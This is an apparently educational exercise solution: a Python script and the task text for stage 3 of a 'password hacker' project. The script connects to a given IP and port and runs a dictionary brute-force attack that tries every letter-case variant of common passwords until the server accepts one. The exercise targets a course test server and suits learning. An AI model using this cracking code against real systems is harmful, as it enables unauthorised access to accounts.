import itertools
import socket
import sys
import os


def socket_interaction(**kwargs):
    with socket.socket() as client_socket:
        hostname = kwargs['ip']
        port = int(kwargs['port'])
        address = (hostname, port)
        client_socket.connect(address)
        path = os.path.join(os.getcwd(), 'hacking\\passwords.txt')
        with open(path, 'r', encoding='utf-8') as file:
            finish = False
            for password in file:
                if not password.strip().isdigit():
                    tmp = itertools.product(*([letter, letter.upper()] for letter in password.strip()))
                else:
                    tmp = (password.strip(), )
                for message in tmp:
                    data = ''.join(message)
                    client_socket.send(data.encode())
                    response = client_socket.recv(1024)
                    response = response.decode('utf-8')
                    if response == 'Connection success!':
                        print(data)
                        finish = True
                        break
                    if response == 'Wrong password!':
                        continue
                if finish:
                    break
            else:
                print('Too many attempts')


param = {'ip': sys.argv[1], 'port': sys.argv[2]}

socket_interaction(**param)

"""
Stage 3/5: Smarter, dictionary-based brute force
Description
Looks like you can already call yourself a hacker! However, the situation gets more complicated: the admin improves the server and our simple brute force attack is no longer working. Well, this shouldn't hold you back: you can provide your program with a prepared dictionary of typical passwords (it was generated using a database with over a million real-life passwords).

That's not all: the admin decided to outsmart us and changed the case of some letters in the new password so that we could not crack it using the password dictionary. Let's outsmart the admin and try all possible combinations of upper and lower case for each letter for all words of the password dictionary. We won't have to try too much since for a 6-letter word you'll get only 64 possible combinations.

Now you need not only to try each element of the dictionary but also change the case of some letters to find the correct password.

This has increased the time of hacking greatly, so using brute force is probably not an option. Use the dictionary of standard passwords, and do not forget to try changing the cases of different letters. For example, there is the word ‘qwerty’ in the dictionary, but the cunning admin sets it to ‘qWeRTy’. Your program should make it possible to hack such passwords, too.

Objectives
In this stage, you should write a program that:

Parses the command line and gets two arguments that are IP address and port.
Finds the correct password using the list of typical passwords.
Prints the password it found.
Put the file with typical passwords into your working directory which you can find with a little help of the os module.
Note that here and throughout the project, the password is different every time you check your code.

Example
The greater-than symbol followed by a space (> ) represents the user input. Note that it's not part of the input.

> python hack.py localhost 9090
qWeRTy
"""